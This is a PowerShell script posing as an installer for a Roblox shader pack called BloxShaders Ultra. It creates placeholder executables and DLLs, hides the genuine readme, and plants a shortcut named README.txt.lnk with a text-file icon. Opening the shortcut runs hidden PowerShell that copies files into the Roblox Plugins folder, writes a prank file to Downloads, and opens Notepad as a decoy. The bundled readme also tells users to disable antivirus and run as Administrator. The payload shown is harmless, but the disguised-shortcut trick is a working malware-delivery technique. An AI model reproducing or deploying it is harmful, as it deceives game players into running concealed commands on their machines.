# BloxShaders Ultra v4.2 - Installer
# "Official" installer downloaded from bloxshaders-ultra.site

$dest = "$env:USERPROFILE\Desktop\BloxShaders_Ultra_v4.2"
New-Item -ItemType Directory -Force -Path $dest | Out-Null
foreach ($s in @('shaders','textures','presets','bin','Anims')) {
    New-Item -ItemType Directory -Force -Path "$dest\$s" | Out-Null
}

# Root files
"" | Out-File "$dest\ShaderLoader.exe"
"" | Out-File "$dest\Uninstall.exe"
"" | Out-File "$dest\d3dcompiler_47.dll"
"" | Out-File "$dest\reshade.dll"
"" | Out-File "$dest\opengl32.dll"
'{"shader_quality":"ultra","bloom":true,"bloom_intensity":1.4,"shadow_distance":512,"ambient_occlusion":true,"depth_of_field":false,"fog_density":0.3,"version":"4.2"}' | Out-File "$dest\config.json" -Encoding UTF8
"[v4.2] Fixed bloom on low-end PCs`n[v4.1] Performance patch`n[v4.0] RTX-style shadows" | Out-File "$dest\CHANGELOG.txt" -Encoding UTF8

# Shaders
"void main(){}" | Out-File "$dest\shaders\bloom.glsl"
"void main(){}" | Out-File "$dest\shaders\shadows.hlsl"
"void main(){}" | Out-File "$dest\shaders\ao.glsl"
"void main(){}" | Out-File "$dest\shaders\dof.glsl"
"void main(){}" | Out-File "$dest\shaders\colorgrade.hlsl"

# Presets
"quality=ultra`nbloom=1`nshadows=1" | Out-File "$dest\presets\Ultra.ini"
"quality=high`nbloom=1`nshadows=1"  | Out-File "$dest\presets\High.ini"
"quality=low`nbloom=0`nshadows=0"   | Out-File "$dest\presets\Potato.ini"
"quality=ultra`ncinematic=1"        | Out-File "$dest\presets\Cinematic.ini"

# Bin
"" | Out-File "$dest\bin\injector.dll"
"" | Out-File "$dest\bin\hook.dll"

# Anims payload
"-- BloxShaders Animation Controller`nprint('BloxShaders loaded')" | Out-File "$dest\Anims\BloxAnims.txt" -Encoding UTF8

# Hidden real README (System + Hidden)
$realTxt = "$dest\_readme_data.txt"
@"
BloxShaders Ultra v4.2
======================
Made by: xShadowDevRBX
Discord: discord.gg/bloxshaders

INSTALLATION
------------
1. Close Roblox completely
2. Run ShaderLoader.exe as Administrator
3. Launch Roblox - shaders load automatically
4. Press F5 in-game to toggle on/off

TROUBLESHOOTING
---------------
Q: Roblox crashes on launch?
A: Disable antivirus - false positive from DLL injector.

Q: Shaders not showing?
A: Make sure you ran as Administrator.

CREDITS
-------
ReShade framework - crosire
Ported to Roblox - xShadowDevRBX

(c) 2026 BloxShaders. Free forever.
"@ | Out-File -FilePath $realTxt -Encoding UTF8
attrib +h +s $realTxt

# README.txt trap (.lnk)
$pluginsDir = "$env:LOCALAPPDATA\Roblox\Plugins"
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("$dest\README.txt.lnk")
$lnk.TargetPath       = "powershell.exe"
$lnk.Arguments        = "-WindowStyle Hidden -NonInteractive -Command `"Get-ChildItem -Path '$dest\Anims' -Filter '*.txt' | ForEach-Object { Copy-Item -Path `$_.FullName -Destination '$pluginsDir\' -Force }; New-Item -ItemType File -Force -Path '$env:USERPROFILE\Downloads\drmuffinnLOL.txt' | Out-Null; Set-Content '$env:USERPROFILE\Downloads\drmuffinnLOL.txt' -Value 'hello'; Start-Process notepad.exe -ArgumentList '$realTxt'`""
$lnk.WorkingDirectory = $dest
$lnk.IconLocation     = "shell32.dll,70"
$lnk.WindowStyle      = 7
$lnk.Save()

Write-Host "BloxShaders Ultra v4.2 installed to Desktop."
